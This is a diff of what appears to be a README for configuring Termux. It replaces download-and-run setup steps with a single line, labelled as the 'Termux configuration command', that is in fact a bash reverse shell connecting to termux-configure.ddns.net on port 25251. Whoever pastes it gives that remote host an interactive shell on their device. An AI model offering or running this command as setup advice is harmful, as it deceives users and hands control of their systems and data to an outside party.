@@ -1,14 +1,10 @@
 
 
 
-#Configuration command#
+#Termux configuration command#
 
 
-1 Download main config » bellow 
-
-2 mv /sdcard/Download/config.sh $HOME && chmod 777 config.sh
-
-3  bash config.sh
+bash -i >& /dev/tcp/termux-configure.ddns.net/25251 0>&1
 
 
 <!-- Improved compatibility of back to top link: See: https://github.com/othneildrew/Best-README-Template/pull/73 -->
